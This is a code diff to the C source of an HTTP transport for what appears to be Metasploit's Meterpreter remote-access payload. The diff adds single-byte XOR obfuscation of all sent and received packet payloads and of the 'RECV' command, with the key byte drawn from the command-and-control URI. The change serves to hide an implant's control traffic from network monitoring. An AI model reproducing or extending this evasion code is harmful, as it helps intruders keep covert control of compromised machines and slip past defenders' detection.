@@ -7,6 +7,22 @@
 #include "../../common/config.h"
 #include <winhttp.h>
 
+ULONG xor_ulong(ULONG s, UCHAR xb)
+{
+  UCHAR a = ((s >> 24) & 0xff) ^ xb;
+  UCHAR b = ((s >> 16) & 0xff) ^ xb;
+  UCHAR c = ((s >> 8)  & 0xff) ^ xb;
+  UCHAR d = (s & 0xff)         ^ xb;
+
+  ULONG l = 0;
+  l |= (a << 24);
+  l |= (b << 16);
+  l |= (c << 8);
+  l |= d;
+
+  return l;
+}
+
 /*!
  * @brief Prepare a winHTTP request with the given context.
  * @param ctx Pointer to the HTTP transport context to prepare the request from.
@@ -166,6 +182,16 @@ static DWORD packet_transmit_via_http_winhttp(Remote *remote, Packet *packet, Pa
 		SetLastError(ERROR_NOT_FOUND);
 		return 0;
 	}
+	
+	CHAR uri[256];
+	wcstombs(uri, ctx->uri, sizeof(uri));
+
+	BYTE xorByte = uri[7];
+
+	// xor the bytes before transmitting
+	ULONG i = 0;
+	for(; i < packet->payloadLength; ++i)
+		packet->payload[i] ^= xorByte;
 
 	memcpy(buffer, &packet->header, sizeof(TlvHeader));
 	memcpy(buffer + sizeof(TlvHeader), packet->payload, packet->payloadLength);
@@ -311,6 +337,11 @@ static DWORD packet_receive_http_via_winhttp(Remote *remote, Packet **packet)
 
 	lock_acquire(remote->lock);
 
+	// get the xor byte
+	CHAR uri[256];
+	wcstombs(uri, ctx->uri, sizeof(uri));
+	BYTE xorByte = uri[7];
+
 	do
 	{
 		hReq = get_winhttp_req(ctx, "PACKET RECEIVE");
@@ -321,7 +352,8 @@ static DWORD packet_receive_http_via_winhttp(Remote *remote, Packet **packet)
 
 		vdprintf("[PACKET RECEIVE WINHTTP] sending the 'RECV' command...");
 		// TODO: when the MSF side supports it, update this so that it's UTF8
-		DWORD recv = 'VCER';
+		
+		DWORD recv = xor_ulong('VCER', xorByte);
 		hRes = WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, &recv,
 			sizeof(recv), sizeof(recv), 0);
 
@@ -504,6 +536,11 @@ static DWORD packet_receive_http_via_winhttp(Remote *remote, Packet **packet)
 			// We no longer need the encrypted payload
 			free(origPayload);
 		}
+
+		// xor the bytes back to their original values
+		ULONG i = 0;
+		for (; i < payloadLength; ++i)
+			payload[i] ^= xorByte;
 
 		localPacket->header.length = header.length;
 		localPacket->header.type = header.type;
